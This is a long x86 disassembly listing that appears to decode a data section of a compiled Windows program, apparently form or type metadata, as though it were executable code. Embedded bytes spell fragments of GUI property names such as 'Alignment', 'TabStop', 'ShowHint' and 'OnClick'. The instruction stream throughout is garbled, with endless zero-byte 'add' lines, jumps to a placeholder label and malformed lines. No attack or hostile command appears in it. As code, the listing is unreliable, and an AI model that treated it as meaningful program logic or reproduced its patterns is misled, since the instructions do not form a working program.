xor [ ebx + 0x43 ] al
add [ edx + eax * 2 + 0x320043 ] bh
or [ ebx + 0x74 ] dl
inc ebx
je r-xdata
pop esp
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
push cs
add [ eax ] cl
inc ecx
jne r-xdata
insb
jae r-xdata
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b0012 ] al
outsd
outsb
jae r-xdata
outsd
push ebx
imul edi [ edx + 0x65 ] r-xdata
pop edi
add [ eax ] al
push [ eax ]
add dh bh
test al 0xd5
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4208000f ] al
imul eax [ ecx + ebp * 2 + 0x4d ] 0x3865646f
xchg [ ebx ] al
test ah dl
inc ebx
add [ esp + edx * 8 - 0xb8bffbd ] dh
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43070010 ] al
popad
jo r-xdata
add bh bh
movsb [ edi ] [ esi ]
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or al 0x0
or [ ecx + 0x6c ] eax
imul esp [ edi + 0x6e ] 0x746e656d
nop
xchg [ ebx ] al
popad
add [ eax ] al
add [ eax + 0x7f ] ch
inc ebx
add [ ebx ] bl
add bh bh
cwde
leave
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax [ eax ]
add eax 0x67696c41
outsb
int3
add [ eax ] dl
add dh bh
add [ fs : eax ] al
jb r-xdata
add bh bh
fwait
add [ eax ] al
inc [ ecx ]
imul ebp [ edi + 0x6e ] sub_41c110
jo r-xdata
add [ eax ] al
add [ 0x72440800 ] dl
popad
dec ebp
outsd
add [ gs : eax ] dl
inc eax
imul ebp [ esi + 0x74 ] 0x437f5073
add [ edx ] bh
add bh bh
jpe r-xdata
add bh bh
and al 0xd6
inc ebx
add [ eax - 0x2a ] al
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43050011 ] al
outsd
insb
outsd
jb r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
xor ah 0xff
xchg [ ebx ] eax
je r-xdata
jae r-xdata
add bh bh
dec esp
stc
add bh bh
call 0x1438900
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x460c0017 ] al
outsd
arpl [ ebp + 0x73 ] si
inc ebx
outsd
outsb
je r-xdata
jb r-xdata
inc eax
add [ ecx ] bl
add bh bh
mov al 0xd5
inc ebx
add [ ecx ] al
outsd
insb
mov al 0xc5
inc ecx
add [ eax ] ch
add bh bh
js r-xdata
add [ eax - 0xc ] al
adc eax [ eax ]
or al [ edx + esi * 2 + 0x61 ]
inc ebx
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc al 0x0
or [ edx + esi * 2 + 0x61 ] al
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
test [ ebx ] eax
fwait
add [ eax ] al
[ ebx + 0x1ff0000 ]
add [ eax + 0x1 ] al
outsb
je r-xdata
inc ebx
add [ eax + 0x43d5 ] cl
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46040018 ] al
outsd
outsb
je r-xdata
adc [ eax ] al
fsub [ ebp + 0x43 ]
add [ eax ] bl
inc bx
add [ eax + 0xff0001 ] cl
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x540b0020 ] al
jb r-xdata
or [ eax + 0x6f ] edx
outsd
outsb
je r-xdata
adc [ eax ] al
pushad
add [ eax ] al
[ eax + eax ]
add [ eax ] al
and eax [ eax ]
or [ edi + 0x6f ] dl
jb r-xdata
outsb
jae r-xdata
je r-xdata
jo r-xdata
adc [ eax ] al
0xf8ff0000 0x43d5
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb al 0x0
add [ eax ] al
and [ esi ] 0x0
or cl [ edi + 0x6e ]
push edi
add [ eax ] eax
jmp [ eax ]
popad
jb r-xdata
jb r-xdata
push edi
inc ecx
inc ebx
add [ esi + 0x1 ] ch
add bh bh
pop esp
inc bx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
and [ eax ] eax
push es
dec esp
popad
jns r-xdata
je r-xdata
outsb
jne r-xdata
push 0x6948776f
outsb
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5308001f ] al
outsb
je r-xdata
add [ eax ] 0x0
add [ eax + 0x4f09002a ] al
outsb
inc esp
jb r-xdata
jo r-xdata
outsb
add bh bh
xor [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
and eax 0x6e4f0e00
jne r-xdata
adc [ eax ] al
jo r-xdata
inc eax
add [ ecx - 0x2b010000 ] bl
aad 0x43
add [ ebp + edx * 8 + 0x43 ] bl
add [ eax - 0x80000000 ] al
pop ds
add [ eax ] cl
push ebx
add [ eax ] dl
push 0x6948776f
outsb
je r-xdata
add [ eax ] al
add [ eax + 0x4f09002d ] al
outsb
dec ebp
outsd
jne r-xdata
hlt
xchg [ ebx ] eax
rol [ eax ] 0x1
add bh bh
rol [ eax ] 0x1
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub eax [ eax ]
or ecx [ edi + 0x6e ]
jo r-xdata
add [ eax ] al
and [ eax ] 0x0
or edx [ edx + esi * 2 + 0x61 ]
adc eax 0x1200041
add bh bh
and [ ecx ] al
add bh bh
adc al 0xf5
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f070024 ] al
outsb
inc ebx
insb
imul esp [ ebx + 0x6b ] r-xdata
xor [ ecx ] al
add [ eax ] al
js r-xdata
inc ebx
outsd
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e0025 ] al
outsb
add [ eax ] dl
inc eax
add [ edi ] dl
add bh bh
movsb [ edi ] [ esi ]
rol [ ebx ] cl
hlt
push ds
add [ 0x776f6853 ] cl
inc ecx
arpl [ ebx + 0x65 ] sp
insb
inc ebx
push 0x10007261
add bh bh
cld
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add [ ebx ] cl
push eax
popad
jb r-xdata
leave
inc esp
add [ eax + eax ] bh
inc esp
outsd
arpl [ ebx + 0x40 ] bp
mov al [ ebx ]
adc [ ecx ] al
add bh bh
adc [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor [ eax ] eax
push ebp
jo r-xdata
je r-xdata
inc esp
inc ebp
outsb
inc esp
jb r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
sub al [ eax ]
or [ edi + 0x6e ] ecx
add [ eax + 0x4f0a0028 ] al
outsb
inc esp
jb r-xdata
mov [ ebx ] eax
[ eax ] al
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
dec ebp
outsd
jne r-xdata
add [ eax ] al
add [ eax + 0x4f0b002b ] al
dec edi
jbe r-xdata
mov [ edx + 0x1080043 ] cl
push eax
outsd
jo r-xdata
jo r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
sbb eax 0x6f500900
outsb
je r-xdata
add [ esp + eax * 8 - 0x4d6fffbd ] dl
inc ecx
jb r-xdata
adc eax 0x1800041
add bh bh
add [ ecx ] 0x0
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0c002e ] al
or ecx [ edi + 0x6e ]
push ebx
je r-xdata
xor [ ecx ] 0x0
jb r-xdata
insb
mov [ ebx ] al
fadd [ eax ]
add bh bh
fadd [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub al 0x0
or ecx [ edi + 0x6e ]
dec ebp
outsd
jne r-xdata
outsb
jb r-xdata
inc ebp
outsb
inc esp
outsd
arpl [ ebx - 0x78 ] bp
mov al [ ebx ]
sbb [ ecx ] al
add bh bh
sbb [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] eax
dec [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090029 ] al
outsb
jo r-xdata
push cs
push eax
popad
jb r-xdata
outsd
insb
outsd
jb r-xdata
or al 0x68
inc ebx
add [ eax - 0x3d ] cl
inc ebx
add ah ah
cdq
inc esp
add [ ecx + edi * 8 + 0x43 ] bh
add al al
les eax [ ebx ]
jl r-xdata
inc esp
jb r-xdata
inc ebp
outsb
jae r-xdata
adc eax 0x1780041
add bh bh
js r-xdata
popad
jbe r-xdata
dec ebp
outsd
jbe r-xdata
js r-xdata
add bh bh
or [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub [ eax ] eax
or [ edi + 0x6e ] ecx
mov al [ ebx ]
or [ ecx ] al
add [ edi ] al
push esi
imul esi [ ebx + 0x69 ] 0x656c62
adc [ eax ] al
outsd
add [ eax ] eax
inc esp
bound ebp [ ebx + eax * 2 + 0x6c ]
imul esp [ ebx + 0x6b ] r-xdata
call 0xffffffffe94247e5
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0027 ] al
outsb
inc esp
jb r-xdata
adc eax 0x1280041
add bh bh
sub [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ es : edx ] cl
dec edi
outsb
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb eax [ eax ]
or dl [ eax + 0x61 ]
jb r-xdata
adc [ eax ] al
pop ecx
add [ eax ] al
push [ eax + 0x10043d5 ]
mov dl 0x41
inc ebx
add [ edx + ebx * 4 ] dh
inc esp
add [ eax - 0x66 ] cl
inc esp
add [ ebx + eax * 8 - 0x658fffbd ] dh
inc esp
add [ eax ] dl
les eax [ ebx ]
inc esp
push 0xc4300043
inc ebx
add [ eax - 0x7bffbb66 ] al
stc
inc ebx
add [ eax * 8 - 0x3a9bffbd ] ah
inc ebx
add [ eax - 0x3c ] dl
inc ebx
add [ edx + ebx * 4 - 0x6567ffbc ] dl
inc esp
add [ esp + eax * 8 + 0x43 ] dh
add ah ah
rol [ ebx ] 0x11
push esp
inc edx
jne r-xdata
add [ ebx + esi * 4 ] ah
inc ecx
add [ eax - 0x4d ] bh
inc ecx
add ah dl
retn 0x43
nop
mov dl 0x41
add [ ebx + esi * 4 ] cl
inc ecx
add al ch
retn
les ecx [ bx + di + 0x43 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsb
dec ebp
outsd
jne r-xdata
sub [ esi ] 0x0
or al 0x4f
outsd
ja r-xdata
inc esp
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0c002f ] al
outsb
dec ebp
outsd
jne r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
das
add [ edi + ecx * 2 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x4a ] al
dec eax
mov [ ebx ] es
add [ ecx ] al
add bh bh
add [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor [ eax ] al
or ecx [ edi + 0x6e ]
push ebx
je r-xdata
or al 0x4f
hlt
rol [ ebx ] cl
add al 0xb2
je r-xdata
inc ebx
add [ eax + eax ] ch
add [ eax ] al
mov [ ebx + 0x336c0043 ] dl
inc eax
add [ eax + 0x33 ] bh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax + 0x74004033 ] al
xor eax [ eax ]
mov esp 0xd8004030
xor [ eax ] al
fdiv [ edx + 0x67e80041 ]
inc ebx
dec edx
dec esp
xor eax [ eax ]
xor [ ebx ] 0x40
add [ ebx + esi + 0x40 ] dh
add [ eax + esi + 0x30d80040 ] bh
inc eax
add al bl
jb r-xdata
inc ebx
outsd
outsb
je r-xdata
inc esp
add [ edx + ebx + 0x44 ] al
add [ ebp + ecx * 2 + 0x38f00044 ] dh
inc esp
add al ah
cmp eax [ eax + eax + 0x4c ]
imul eax [ ebx ] sub_436970
add al 0x0
cmp [ ebp - 0x10ffec ] bh
fcos
in al dx
imul eax [ ebx ] sub_436a38
cld
push 0x69440043
inc ebx
add [ esi ] cl
push esp
inc edx
jne r-xdata
inc ecx
add ah ch
scasb [ edi ]
inc ecx
add ah ah
scasb [ edi ]
inc ecx
add [ edx + esi * 4 ] cl
inc ecx
add [ eax - 0x73ffbc98 ] ch
inc edx
inc esp
add [ eax - 0xbffbbb9 ] ch
inc esi
inc esp
add al cl
mov [ ebx ] sub_443d08
sub [ 0x3a400044 ] bh
inc esp
add [ eax ] dl
mov [ ebx ] sub_43c714
add al 0xf7
inc ebx
add [ eax ] dh
test [ ebx ] r-xdata
mov eax cs
inc ebx
add al ah
rol [ ebx ] cl
pop eax
rol [ ebx ] cl
insb
salc
inc ebx
add [ eax ] bl
aad 0x43
add [ ecx + ebp * 2 + 0x43 ] dh
add [ edi + esi * 8 + 0x3a940043 ] dh
inc esp
add [ eax + 0x3b ] dl
inc esp
add [ esi + esi + 0x44 ] cl
add [ ebx + edi ] dh
inc esp
add ah cl
cld
inc ebx
add [ eax + 0x3 ] ah
inc esp
add [ eax ] al
adc [ eax + eax + 0x64 ] eax
push 0x43
add al ch
or eax 0xc180044
inc esp
add [ eax - 0x63ffbbef ] bl
adc [ eax + eax + 0x54 ] eax
adc [ eax + eax - 0x4 ] al
cmove eax [ eax ]
je r-xdata
inc ebx
add [ edx + edx * 8 + 0x43 ] ch
add [ edx + esi * 4 ] al
outsb
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul ebp [ esi + 0x6b ] 0x4aa0c08b
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x434b ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x4b ] dh
inc ebx
add [ edx + 0xc00434b ] cl
add al [ eax ]
add [ edx * 4 - 0x4e13ffbd ] ch
inc ecx
add [ eax + 0x33 ] bh
inc eax
add [ eax - 0x55 ] al
inc ecx
add [ eax - 0x27ffbfcd ] al
pop ss
inc esp
add [ eax + esi + 0x30d80040 ] bh
inc eax
add [ eax + 0x780043fa ] dh
inc edi
inc esp
add [ eax + 0x1c00440f ] ah
inc edi
inc ecx
add [ esi * 8 - 0x36abffbd ] dh
inc ebx
add [ esp + edi * 8 + 0x43 ] dl
add al ch
inc ebx
inc ecx
push ebx
je r-xdata
outsd
insb
lea eax [ eax ]
mov al [ 0x700434b ]
jb r-xdata
je r-xdata
push esp
leave
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
je r-xdata
inc ebx
inc esp
add [ edi + eax * 2 ] bl
jns r-xdata
arpl [ edx + 0x47 ] sp
outsb
je r-xdata
inc esp
add [ edx + ebx + 0x44 ] al
add [ ebp + ecx * 2 + 0x38f00044 ] dh
inc esp
add al ah
cmp eax [ eax + eax - 0x78 ]
imul eax [ ebx ] 0xffffffa8
imul eax [ ebx ] 0x34
imul eax [ ebx ] 0x6
add [ 0x6b01000 ] al
mov al 0x11
mov ebp 0xffcaffeb
cwde
insb
inc ebx
add [ esp + ebp * 2 + 0x6cb40043 ] ch
inc ebx
add [ eax + 0x6d ] dl
inc ebx
add [ ebx + ebp * 2 + 0x43 ] dh
scasb [ edi ]
inc ecx
add ah ah
scasb [ edi ]
inc ecx
add [ edx + esi * 4 ] cl
inc ecx
add [ edx + ebp * 2 + 0x428c0043 ] bl
inc esp
add [ eax - 0xbffbbb9 ] ch
inc esi
inc esp
add al cl
mov [ ebx ] sub_443d08
sub [ 0x3a400044 ] bh
inc esp
add [ eax ] dl
mov [ ebx ] sub_43c714
add al 0xf7
inc ebx
add [ eax ] dh
test [ ebx ] r-xdata
mov eax cs
inc ebx
add al ah
rol [ ebx ] cl
pop eax
rol [ ebx ] cl
insb
salc
inc ebx
add [ eax ] bl
aad 0x43
add [ ecx + ebp * 2 + 0x43 ] dh
add [ edi + esi * 8 + 0x3a940043 ] dh
inc esp
add [ eax + 0x3b ] dl
inc esp
add [ esi + esi + 0x44 ] cl
add [ ebx + edi ] dh
inc esp
add ah cl
cld
inc ebx
add [ eax + 0x3 ] ah
inc esp
add [ eax ] al
adc [ eax + eax + 0x10 ] eax
insb
jae r-xdata
add [ esp + edi * 8 + 0x43 ] dl
add [ edx + edx * 8 + 0x43 ] ch
add [ edx + esi * 4 ] al
inc ecx
add ah ch
inc ecx
add [ esi * 8 - 0x36abffbd ] dh
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x4d ] dh
outsb
inc ebx
outsd
outsb
je r-xdata
xor al 0xf5
inc ebx
add [ ecx + ecx * 8 + 0x43 ] dl
je r-xdata
or [ fs : ebx + 0x74 ] dl
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ch
dec esi
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al bl
dec esi
inc ebx
add [ eax ] cl
imul eax [ ebx ] 0xf
push esp
inc ebx
jne r-xdata
inc ebx
add [ eax ] bl
add al [ eax ]
add [ esp + ecx * 2 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
fmul [ esi + 0x43 ]
je r-xdata
push cs
push esp
inc edx
jne r-xdata
add [ edi ] al
inc eax
add [ eax + 0x4c ] ah
inc ebx
add [ eax ] al
outsd
insb
mov al [ 0xffffffffe000434a ]
cwde
inc ebx
add [ ebx ] cl
add [ eax ] cl
push ebx
je r-xdata
add [ ebp + ecx * 2 + 0x43 ] ch
inc esp
add [ edx + ebx + 0x44 ] al
add [ ebp + ecx * 2 + 0x38f00044 ] dh
inc esp
add al ah
cmp eax [ eax + eax - 0x78 ]
imul eax [ ebx ] 0xffffffa8
imul eax [ ebx ] 0x34
imul eax [ ebx ] 0x9
push esp
inc ebx
push 0x426b6365
outsd
js r-xdata
add [ eax ] al
insd
inc ebx
push 0x426b6365
outsd
js r-xdata
add [ eax ] al
jo r-xdata
inc ebx
je r-xdata
push cs
add [ ebx ] cl
inc ecx
insb
insb
outsd
ja r-xdata
inc ebx
je r-xdata
add [ eax ] bl
aad 0x43
add [ ecx + ebp * 2 + 0x43 ] dh
add [ edi + esi * 8 + 0x3a940043 ] dh
inc esp
add [ eax + 0x3b ] dl
inc esp
add [ esi + esi + 0x44 ] cl
add [ ebx + edi ] dh
inc esp
add ah cl
cld
inc ebx
add [ eax + 0x3 ] ah
inc esp
add [ eax ] al
adc [ eax + eax + 0x10 ] eax
insb
inc ebx
add al ch
or eax 0x6c6c0044
inc ebx
add [ eax - 0x63ffbbef ] bl
adc [ eax + eax + 0x54 ] eax
adc [ eax + eax - 0x4 ] al
cmove eax [ eax ]
je r-xdata
inc ebx
add [ esi + edx * 8 + 0x43 ] ch
shr al 0x4e
inc ebx
add [ edi ] al
or [ ebx + eax * 2 + 0x68 ] edx
arpl [ gs : ebx + 0x42 ] bp
outsd
js r-xdata
insb
inc ebx
add al ch
or eax 0x6c6c0044
inc ebx
add [ eax - 0x63ffbbef ] bl
adc [ eax + eax + 0x54 ] eax
adc [ eax + eax - 0x4 ] al
cmove eax [ eax ]
je r-xdata
inc esp
add [ eax ] dl
shl [ eax + 0x4d ] 0x43
add [ edi ] al
andps xmm0 [ ebx + 0x75 ]
jae r-xdata
inc ebx
add [ edx + eax ] dl
add [ eax ] al
push esp
dec edx
inc ebx
add [ edx + 0x4d ] bl
insb
jae r-xdata
outsd
cmp [ gs : esi - 0x2b7bffbd ] al
jb r-xdata
add [ ecx ] ah
add bh bh
fadd st7
inc ebx
add [ eax + ecx * 8 + 0x43 ] dh
add [ eax ] al
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
sldt [ edi ]
inc ecx
outsb
arpl [ eax + 0x6f ] bp
jb r-xdata
insb
jae r-xdata
add [ esi ] dh
add [ eax ] cl
push ebx
je r-xdata
dec ebp
inc ebx
dec esi
inc ebx
add [ eax - 0x55 ] al
inc ecx
add [ eax - 0x27ffbfcd ] al
pop ss
inc esp
add [ eax + esi + 0x30d80040 ] bh
inc eax
add [ eax + 0x780043fa ] dh
inc edi
outsd
insd
inc ebx
push 0x426b6365
outsd
js r-xdata
add [ ebp + 0x4bcc0040 ] cl
inc ebx
add [ ebx ] al
push cs
push esp
inc ebx
push 0x426b6365
outsd
js r-xdata
cmp eax 0x3dc40044
inc esp
add [ eax ] al
add [ eax ] al
imul ebp [ edi + 0x6e ] r-xdata
enter 0x0 0xfe
int3
popad
jo r-xdata
add [ edi ] al
inc ebx
jns r-xdata
inc eax
salc
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43050013 ] al
outsd
insb
outsd
jb r-xdata
inc eax
adc al 0x41
add [ edi ] bl
add bh bh
jo r-xdata
imul eax [ ebx ] 0x1
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or eax 0x6c410900
imul esp [ edi + 0x6e ] 0x746e656d
add [ eax ] dl
inc eax
add [ ecx ] dl
add al [ eax ]
call [ ecx ]
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ eax + 0x2c ] ah
inc ecx
add [ eax + eax ] bh
add dh bh
clc
mov [ ebx ] 0x1
add [ eax ] al
add [ eax - 0x80000000 ] al
or al 0x0
push es
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
sbb [ ecx + eax * 2 ] dl
add [ eax ] dl
add al [ eax ]
call [ ebx + ebp * 2 + 0x10043 ]
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
inc ebx
add ah ch
mov cl 0x41
add [ eax + 0x33 ] bh
inc eax
dec esp
inc ebx
add [ ebx + ecx * 2 + 0xc0043 ] bl
or [ ebx + 0x74 ] dl
inc ebx
je r-xdata
add [ eax ] al
add [ eax ] al
add [ ecx * 2 + 0x4d5a0043 ] dh
je r-xdata
add [ gs : eax ] dl
xor eax [ eax + edx * 2 + 0x7f ]
inc ebx
add [ edx ] bh
add bh bh
jpe r-xdata
nop
xchg [ ebx ] al
popad
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43050015 ] al
je r-xdata
xchg [ ebx ] eax
je r-xdata
inc ebx
add [ esp + edx * 8 - 0xb8bffbd ] dh
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43070011 ] al
add dh bh
test al 0xd5
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x42080010 ] al
imul eax [ ecx + ebp * 2 + 0x4d ] 0x3865646f
xchg [ ebx ] al
test ah dl
js r-xdata
insb
jae r-xdata
add ah ch
add [ edx + ecx * 2 + 0x43 ] dl
je r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add bh bh
dec esp
stc
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b0014 ] al
outsd
outsb
jae r-xdata
mov [ ebx ] sub_43c714
add al 0xf7
inc ebx
add [ eax ] dh
test [ ebx ] r-xdata
mov eax cs
inc ebx
add al ah
rol [ ebx ] cl
pop eax
rol [ ebx ] cl
insb
salc
inc ebx
cmp al [ eax + eax + 0x10 ]
inc esp
add [ eax + 0x1c00440f ] ah
inc edi
inc ecx
add [ esi * 8 - 0x36abffbd ] dh
inc ebx
add [ esp + edi * 8 + 0x43 ] dl
add [ edx + edx * 8 + 0x43 ] ch
add [ edx + esi * 4 ] al
inc ecx
add ah ch
scasb [ edi ]
inc ecx
add ah ah
scasb [ edi ]
inc ecx
add [ edx + esi * 4 ] cl
inc ecx
add [ edx + ebp * 2 + 0x428c0043 ] bl
inc esp
add [ eax - 0xbffbbb9 ] ch
inc esi
inc esp
add al cl
mov [ ebx ] sub_443d08
sub [ 0x3a400044 ] bh
inc esp
add [ eax ] dl
add [ eax ] dl
inc eax
add [ ecx + eax + 0x3e94ff00 ] ah
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or eax [ eax ]
pop es
push esp
popad
bound edx [ ebx + 0x74 ]
outsd
jo r-xdata
add [ eax ] al
adc [ eax ] al
movsb [ edi ] [ esi ]
add [ eax ] eax
call [ esi + edi + 0x10044 ]
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
mov cl 0x41
add [ eax + 0x33 ] bh
inc eax
add [ eax - 0x55 ] al
inc ecx
add [ eax - 0x27ffbfcd ] al
pop ss
inc esp
add [ eax + esi + 0x30d80040 ] bh
inc eax
add [ eax + 0x780043fa ] dh
inc edi
inc esp
add [ eax + 0x1c00440f ] ah
inc edi
add [ eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add al cl
dec ebx
inc ebx
add [ ebx ] cl
arpl [ edx + 0x55 ] sp
outsb
arpl [ eax + 0x65 ] bp
arpl [ ebx + 0x65 ] bp
or [ fs : ebx + 0x62 ] esp
inc ebx
push 0x656b6365
or [ fs : ebx + 0x62 ] ah
inc edi
add [ eax ] eax
add [ eax ] al
sbb [ eax ] eax
pop es
inc ebp
outsb
popad
bound ebp [ ebp + 0x64 ]
mov al 0xc5
inc ecx
add [ eax ] ch
inc ebx
jne r-xdata
inc eax
add [ eax ] dl
add dh bh
add [ fs : eax ] al
add bh bh
pushad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sbb [ eax ] al
or [ edx + esi * 2 + 0x61 ] al
dec ebp
outsd
add [ gs : eax ] dl
jb r-xdata
add [ eax ] al
dec esi
inc ebx
add [ eax ] al
adc [ eax ] al
push eax
add [ eax ] al
inc ebx
add [ eax + 0x43d5 ] cl
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4604001a ] al
jae r-xdata
pop ss
add [ eax ] cl
inc esp
jb r-xdata
imul ebp [ esi + 0x74 ] 0x40100073
add [ ebp - 0x5f00ffff ] ah
adc [ eax ] al
pushad
add [ eax ] al
[ eax + eax ]
add bh bh
js r-xdata
jb r-xdata
outsd
outsb
je r-xdata
sbb [ edx ] 0x0
add al 0x46
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
add [ eax - 0xc ] al
push ss
add [ edx ] cl
inc esp
jb r-xdata
test [ ebx ] eax
fwait
add [ eax ] al
[ ebx + 0x1ff0000 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sub_435510
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push esp
push esi
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ch
push esi
inc ebx
add [ edx + 0x56 ] al
inc ebx
add [ edx + eax ] dl
add [ eax ] al
push esp
dec edx
inc ebx
add ah ch
mov cl 0x41
add [ eax + 0x33 ] bh
inc eax
add [ eax - 0x55 ] al
inc ecx
add [ eax - 0x27ffbfcd ] al
pop ss
inc esp
add [ eax + esi + 0x30d80040 ] bh
inc eax
add [ eax + 0x780043fa ] dh
inc edi
inc esp
add [ eax + 0x1c00440f ] ah
inc edi
inc ecx
add [ esi * 8 - 0x36abffbd ] dh
inc ebx
add [ esp + edi * 8 + 0x43 ] dl
add [ edx + edx * 8 + 0x43 ] ch
add [ edx + esi * 4 ] al
inc ecx
add ah ch
scasb [ edi ]
inc ecx
add ah ah
scasb [ edi ]
inc ecx
add [ edx + esi * 4 ] cl
inc ecx
add [ eax + 0x6d ] ah
inc ebx
add [ edx + eax * 2 + 0x47a80044 ] cl
inc esp
add ah dh
inc esi
inc esp
add al cl
mov [ ebx ] sub_443d08
sub [ 0x3a400044 ] bh
inc esp
add [ eax ] dl
mov [ ebx ] sub_43c714
add al 0xf7
inc ebx
add [ eax ] dh
test [ ebx ] r-xdata
mov eax cs
inc ebx
add al ah
rol [ ebx ] cl
pop eax
rol [ ebx ] cl
insb
salc
inc ebx
add [ eax ] bl
aad 0x43
add [ ecx + ebp * 2 + 0x43 ] dh
add [ edi + esi * 8 + 0x3a940043 ] dh
inc esp
add [ eax + 0x3b ] dl
inc esp
add [ esi + esi + 0x44 ] cl
add [ ebx + edi ] dh
inc esp
add ah cl
cld
inc ebx
add [ eax + 0x3 ] ah
inc esp
